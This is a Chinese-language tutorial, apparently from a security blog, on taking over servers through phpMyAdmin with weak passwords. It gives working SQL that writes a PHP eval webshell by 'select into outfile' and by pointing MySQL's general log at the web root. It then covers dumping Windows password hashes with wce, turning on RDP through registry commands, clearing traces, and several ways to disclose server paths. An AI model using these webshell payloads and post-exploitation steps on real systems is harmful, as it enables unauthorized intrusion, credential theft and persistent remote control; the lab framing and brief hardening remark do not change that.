phpmyadmin getshell姿势
phpmyadmin常被用来管理mysql数据库。在ctf比赛和实战中都可能会遇到phpmyadmin弱口令或者空密码的情况，这个时候就需要从phpmyadmin来getshell了，这里总结一下getshell的姿势。

0x00 前言
此次是在虚拟机中用wampserver搭了一个实验环境，然后在本机上执行操作。

靶机：Windows7 x64 IP 192.168.129.129
攻击机： Windows10 x64
PHP版本：5.6
Mysql版本：5.7
Apache版本：2.4

mysql密码为弱密码root，已爆破得到密码。
0x01 常用方法
最常见的应该就是select into outfile写入shell了，需要知道网站的绝对路径，而且比较容易失败。
select @@basedir可以看到mysql所在的绝对路径，此外还有一些爆路径的方法会在下面总结到。

爆出网站绝对路径后你可以开始写入shell。

select load_file('C:/wamp64/www/ma.php')
select '<?php eval($_POST[cmd]); ?>' into outfile 'C:/wamp64/www/ma.php';
当你尝试执行select into outfile时会爆出如图的错误：

执行以下命令：
SHOW VARIABLES LIKE "secure_file_priv";

如果值为文件夹目录，则只允许修改目录下的文件，如果值为NULL则为禁止。
并且这个值是只读变量，只能通过配置文件修改。

0x02 利用日志写shell
mysql5.0版本以上会创建日志文件，可以通过修改日志的全局变量getshell。

检测全局变量(general_log、general_log file)
general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。
general log file 指的是日志的保存路径。
SHOW VARIABLES LIKE 'general%'

由图可知general_log默认关闭，以及日志的存储路径 。

开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在c:\wamp64\bin\mysql\mysql5.7.14\data\的一个.log文件中，其实就是我们常说的日志文件
利用思路：开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用。

set global general_log = "ON";
set global general_log_file='C:/wamp64/www/ma.php';

执行后可以看到生成的伪日志文件ma.php
此时在利用日志的记录插入一句话
select '<?php eval($_POST[cmd]);?>';
打开日志可以看到记录

然后尝试用菜刀连接即可getshell


0x03 获取管理员密码
既然都做到这里了就顺便简单复习一下Windows，继续做下去。
在服务器上如果是管理员启动的mysql服务那么getshell直接就是管理员权限，如果是其他用户则需要提权。
wce，pwdump，mimikatz等工具都能抓取密码，我这里选择上传wce进行密码抓取。

wce抓取
尝试直接抓明文，没有结果，那只能抓hash值了。


拿到hash值后就可以用hashcat或者直接跑彩虹表来获取密码。在线也有ophcrack可以破解。


3389连接
查看一下端口，发现3389没开

开启3389

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f

然后连接，输入刚刚抓到的账号密码即可。


小结
其实这样一套操作下来动静是很大的，要注意清除痕迹，另外在Windows7这类非服务器的系统上远程登录的话会挤掉当前用户，用户掉线马上就知道出事了，当然也可以使用工具让其支持多用户登录，具体就不详细说明了。

0x04 php爆绝对路径方法
插入一句话木马时是需要知道网站绝对路径的，这里总结一下爆路径的方法。

单引号爆路径
直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。
www.xxx.com/news.php?id=1′

错误参数值爆路径
将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。
www.xxx.com/researcharchive.php?id=-1

Google爆路径
结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。

Site:xxx.edu.tw warning
Site:xxx.com.tw “fatal error”
测试文件爆路径
很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。

www.xxx.com/test.php
www.xxx.com/ceshi.php
www.xxx.com/info.php
www.xxx.com/phpinfo.php
www.xxx.com/php_info.php
www.xxx.com/1.php
phpmyadmin爆路径
一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。

/phpmyadmin/libraries/lect_lang.lib.php
/phpMyAdmin/index.php?lang[]=1
/phpMyAdmin/phpinfo.php
load_file()
/phpmyadmin/themes/darkblue_orange/layout.inc.php
/phpmyadmin/libraries/select_lang.lib.php
/phpmyadmin/libraries/lect_lang.lib.php
/phpmyadmin/libraries/mcrypt.lib.php
配置文件找路径
如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。

Windows:
c:\windows\php.ini php配置文件
c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件


Linux:
/etc/php.ini php配置文件
/etc/httpd/conf.d/php.conf
/etc/httpd/conf/httpd.conf Apache配置文件
/usr/local/apache/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件
nginx文件类型错误解析爆路径
说明：
要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径
www.xxx.com/xx.jpg/x.php

0x05 思考
此次是在Windows系统下的实验，如果是Linux是否同样可以利用日志写shell？
于是找了个linux服务器测试

可以发现，我们没有权限在网站目录下创建日志文件。因为此台服务器上MYSQL并没有被赋予在站点根目录下创建文件的权限。所以也无法写shell并解析。

因此，只要做好权限把控，就可以避免此类安全问题
